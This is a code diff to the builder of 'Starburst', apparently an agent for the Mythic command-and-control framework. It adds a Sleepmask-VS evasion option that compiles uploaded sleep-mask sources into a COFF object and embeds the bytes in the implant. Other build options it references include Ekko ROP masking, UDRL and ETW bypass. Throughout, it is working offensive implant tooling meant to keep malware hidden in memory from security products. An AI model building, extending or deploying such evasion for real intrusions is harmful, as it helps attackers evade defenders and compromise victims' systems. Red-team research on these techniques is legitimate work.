@@ -98,7 +98,7 @@ class Starburst(PayloadType):
     name = "starburst"
     file_extension = "bin"
     author = "@Lavender-exe"
-    semver = "1.2.0"
+    semver = "1.3.0"
     supported_os = [ SupportedOS.Windows, SupportedOS.Linux ]
     wrapper = False
     wrapped_payloads = ["erebus_wrapper", "service_wrapper", "scarecrow_wrapper"]
@@ -257,6 +257,7 @@ class Starburst(PayloadType):
             hide_conditions=[
                 HideCondition(name="architecture", operand=HideConditionOperand.EQ, value="x86"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="sleep_mask", operand=HideConditionOperand.EQ, value="sleepmask_vs"),
             ],
         ),
         BuildParameter(
@@ -274,11 +275,31 @@ class Starburst(PayloadType):
             name="sleep_mask",
             group_name="Evasion",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["default", "full_image", "heap", "ekko", "udrl", "custom"],
+            choices=["default", "full_image", "heap", "ekko", "udrl", "sleepmask_vs", "custom"],
             default_value="default",
-            description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL (Ekko + UDRL user data awareness), or custom",
+            description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL, Sleepmask-VS, or custom",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+            ],
+        ),
+        BuildParameter(
+            name="sleepmask_vs_file",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.File,
+            description="Sleepmask-VS ZIP: contains sleepmask-vs/ sources and BOF-Template/ headers. Compiled automatically at build time.",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="sleep_mask", operand=HideConditionOperand.NotEQ, value="sleepmask_vs"),
+            ],
+        ),
+        BuildParameter(
+            name="sleepmask_vs_logging",
+            group_name="Evasion",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Enable Sleepmask-VS debug logging via OutputDebugStringA (visible in DbgView/WinDbg)",
+            hide_conditions=[
+                HideCondition(name="sleep_mask", operand=HideConditionOperand.NotEQ, value="sleepmask_vs"),
             ],
         ),
         BuildParameter(
@@ -417,6 +438,29 @@ class Starburst(PayloadType):
 
             with open(config_h_path, "w") as f:
                 f.write(config_content)
+
+            # Generate sleepmask-vs data header if selected
+            try:
+                mask = self.get_parameter("sleep_mask")
+            except Exception:
+                mask = "default"
+            if mask == "sleepmask_vs":
+                sm_data_path = os.path.join(dst_path, "include", "evasion", "sleepmask_vs_data.h")
+                sm_coff = await self._compile_sleepmask_vs(agent_build_path, arch)
+                if sm_coff:
+                    with open(sm_coff, "rb") as f:
+                        sm_bytes = f.read()
+                    hex_vals = ", ".join(f"0x{b:02x}" for b in sm_bytes)
+                    with open(sm_data_path, "w") as f:
+                        f.write("#ifndef STARBURST_SLEEPMASK_VS_DATA_H\n")
+                        f.write("#define STARBURST_SLEEPMASK_VS_DATA_H\n")
+                        f.write("#define SLEEPMASK_VS_COFF_DATA_DEFINED\n")
+                        f.write(f"static const uint8_t SLEEPMASK_VS_COFF[] = {{ {hex_vals} }};\n")
+                        f.write(f"static const uint32_t SLEEPMASK_VS_COFF_SIZE = {len(sm_bytes)};\n")
+                        f.write("#endif\n")
+                    logger.info(f"Sleepmask-VS COFF embedded: {len(sm_bytes)} bytes from {sm_coff}")
+                else:
+                    logger.warning("Sleepmask-VS selected but compile/find failed - using placeholder")
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -987,6 +1031,12 @@ class Starburst(PayloadType):
             spoof = self.get_parameter("spoof_profile")
         except Exception:
             spoof = "thread"
+        try:
+            mask_type = self.get_parameter("sleep_mask")
+        except Exception:
+            mask_type = "default"
+        if mask_type == "sleepmask_vs":
+            spoof = "off"
         if spoof and spoof != "off":
             defines.append("#define INCLUDE_EVASION_SPOOF")
             if spoof == "worker":
@@ -1021,6 +1071,7 @@ class Starburst(PayloadType):
             "heap": "MASK_HEAP",
             "ekko": "MASK_EKKO",
             "udrl": "MASK_UDRL",
+            "sleepmask_vs": "MASK_SLEEPMASK_VS",
             "custom": "MASK_CUSTOM",
         }
         defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask, 'MASK_DEFAULT')}")
@@ -1044,6 +1095,191 @@ class Starburst(PayloadType):
             defines.append("#define _SKIP_EVASION_ETW 1")
 
         return "\n".join(defines)
+
+    async def _compile_sleepmask_vs(self, build_path, arch):
+        """Compile sleepmask-vs from uploaded ZIP, or fall back to pre-compiled .o."""
+        import io
+
+        try:
+            sm_file_id = self.get_parameter("sleepmask_vs_file")
+        except Exception:
+            sm_file_id = None
+
+        if not sm_file_id:
+            return self._find_sleepmask_vs_coff(arch)
+
+        sm_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+            AgentFileId=sm_file_id,
+        ))
+        if not sm_resp.Success:
+            logger.error(f"Failed to fetch sleepmask-vs ZIP: {sm_resp.Error}")
+            return None
+
+        extract_dir = os.path.join(build_path, "sleepmask_vs_src")
+        os.makedirs(extract_dir, exist_ok=True)
+
+        zip_buf = io.BytesIO(sm_resp.Content)
+        with zipfile.ZipFile(zip_buf, 'r') as z:
+            z.extractall(extract_dir)
+
+        sm_src_dir = self._find_sleepmask_vs_src(extract_dir)
+        if not sm_src_dir:
+            logger.error("Could not locate sleepmask-vs source directory in uploaded ZIP")
+            return None
+
+        bof_template_dir = self._find_bof_template_dir(extract_dir)
+        if not bof_template_dir:
+            logger.error("Could not locate BOF-Template headers in uploaded ZIP")
+            return None
+
+        self._fix_backslash_includes(sm_src_dir)
+
+        debug_h = os.path.join(sm_src_dir, "debug.h")
+        if os.path.isfile(debug_h):
+            with open(debug_h, "r", errors="replace") as fh:
+                content = fh.read()
+            content = content.replace(", __VA_ARGS__)", ", ##__VA_ARGS__)")
+            try:
+                sm_logging = self.get_parameter("sleepmask_vs_logging")
+            except Exception:
+                sm_logging = False
+            if sm_logging:
+                content = re.sub(
+                    r'#define\s+ENABLE_LOGGING\s+0',
+                    '#define ENABLE_LOGGING 1',
+                    content,
+                )
+                logger.info("Sleepmask-VS logging enabled")
+            with open(debug_h, "w") as fh:
+                fh.write(content)
+
+        entry_cpp = self._find_sleepmask_entry(sm_src_dir)
+        if not entry_cpp:
+            logger.error("Could not find sleepmask entry point (*-sleepmask.cpp)")
+            return None
+
+        output_o = os.path.join(build_path, f"sleepmask.{arch}.o")
+        target = "x86_64-w64-mingw32" if arch == "x64" else "i686-w64-mingw32"
+
+        compile_cmd = [
+            "clang", f"--target={target}",
+            "-c",
+            "-fno-stack-protector",
+            "-std=c++20",
+            "-fno-jump-tables",
+            "-fno-asynchronous-unwind-tables",
+            f"-I{sm_src_dir}",
+            f"-I{bof_template_dir}",
+            f"-I{os.path.join(bof_template_dir, 'base')}",
+            "-o", output_o,
+            entry_cpp,
+        ]
+
+        logger.info(f"Sleepmask-VS compile: {' '.join(compile_cmd)}")
+
+        proc = await asyncio.create_subprocess_exec(
+            *compile_cmd, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await _run_with_timeout(proc, 60, "sleepmask-vs compile")
+
+        if proc.returncode != 0:
+            logger.error(f"Sleepmask-VS compile failed:\n{stderr.decode(errors='replace')}")
+            return None
+
+        if not os.path.isfile(output_o):
+            logger.error("Sleepmask-VS compile produced no output")
+            return None
+
+        logger.info(f"Sleepmask-VS compiled successfully: {os.path.getsize(output_o)} bytes")
+        return output_o
+
+    def _find_sleepmask_vs_coff(self, arch):
+        """Locate a pre-compiled sleepmask-vs .o file on disk (any name)."""
+        agent_root = os.path.dirname(str(self.agent_code_path))
+        parent = os.path.dirname(os.path.dirname(os.path.dirname(agent_root)))
+
+        sm_dir = os.path.join(parent, "sleepmask-vs")
+        if not os.path.isdir(sm_dir):
+            return None
+
+        ext = f".{arch}.o"
+        for root, dirs, files in os.walk(sm_dir):
+            for f in files:
+                if f.endswith(ext):
+                    return os.path.join(root, f)
+
+        return None
+
+    def _find_sleepmask_vs_src(self, extract_dir):
+        """Find the sleepmask-vs source directory in an extracted ZIP."""
+        if os.path.isfile(os.path.join(extract_dir, "sleepmask-vs.h")):
+            return extract_dir
+
+        candidate = os.path.join(extract_dir, "sleepmask-vs")
+        if os.path.isdir(candidate) and os.path.isfile(os.path.join(candidate, "sleepmask-vs.h")):
+            return candidate
+
+        for entry in os.listdir(extract_dir):
+            entry_path = os.path.join(extract_dir, entry)
+            if not os.path.isdir(entry_path):
+                continue
+            nested = os.path.join(entry_path, "sleepmask-vs")
+            if os.path.isdir(nested) and os.path.isfile(os.path.join(nested, "sleepmask-vs.h")):
+                return nested
+            if os.path.isfile(os.path.join(entry_path, "sleepmask-vs.h")):
+                return entry_path
+
+        return None
+
+    def _find_bof_template_dir(self, extract_dir):
+        """Find BOF-Template headers directory in an extracted ZIP."""
+        for name in ["bof-vs"]:
+            candidate = os.path.join(extract_dir, name, "BOF-Template")
+            if os.path.isdir(candidate) and os.path.isfile(os.path.join(candidate, "beacon.h")):
+                return candidate
+            for entry in os.listdir(extract_dir):
+                nested = os.path.join(extract_dir, entry, name, "BOF-Template")
+                if os.path.isdir(nested) and os.path.isfile(os.path.join(nested, "beacon.h")):
+                    return nested
+
+        candidate = os.path.join(extract_dir, "BOF-Template")
+        if os.path.isdir(candidate) and os.path.isfile(os.path.join(candidate, "beacon.h")):
+            return candidate
+
+        return None
+
+    def _fix_backslash_includes(self, src_dir):
+        """Replace backslash path separators in #include directives for Linux compatibility."""
+        for root, dirs, files in os.walk(src_dir):
+            for f in files:
+                if not f.endswith((".cpp", ".h")):
+                    continue
+                filepath = os.path.join(root, f)
+                with open(filepath, "r", errors="replace") as fh:
+                    content = fh.read()
+                fixed = re.sub(
+                    r'#include\s+"([^"]*\\[^"]*)"',
+                    lambda m: '#include "' + m.group(1).replace("\\", "/") + '"',
+                    content,
+                )
+                if fixed != content:
+                    with open(filepath, "w") as fh:
+                        fh.write(fixed)
+
+    def _find_sleepmask_entry(self, src_dir):
+        """Find the .cpp that defines the sleep_mask() entry point."""
+        for f in sorted(os.listdir(src_dir)):
+            if not f.endswith(".cpp"):
+                continue
+            filepath = os.path.join(src_dir, f)
+            with open(filepath, "r", errors="replace") as fh:
+                content = fh.read()
+            if re.search(r'\bvoid\s+sleep_mask\s*\(', content):
+                return filepath
+
+        return None
 
     async def _link_with_crystal_palace(self, shellcode, arch, build_path):
         loaders_path = os.path.join(os.path.dirname(str(self.agent_code_path)), "..", "loaders")
